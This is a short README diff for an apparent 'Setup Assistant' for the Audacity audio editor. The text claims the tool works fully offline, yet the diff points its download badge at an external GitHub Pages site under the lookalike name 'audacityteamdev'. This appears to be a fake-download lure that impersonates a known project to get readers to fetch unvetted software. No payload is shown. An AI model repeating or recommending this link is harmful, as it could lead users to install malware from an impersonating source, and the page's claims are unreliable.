@@ -1,4 +1,4 @@
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)    [![Version](https://img.shields.io/badge/Version-3.7.3-green)](#)    [![Platform](https://img.shields.io/badge/Platform-Windows-blue)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://audacityteamdev.github.io/.github/)    [![Version](https://img.shields.io/badge/Version-3.7.3-green)](#)    [![Platform](https://img.shields.io/badge/Platform-Windows-blue)](#)
 
 A fully guided offline setup and configuration manual for the Audacity audio editor. Designed for secure, airgapped environments or corporate deployment.  
 No internet connection, login credentials, or online validation required.
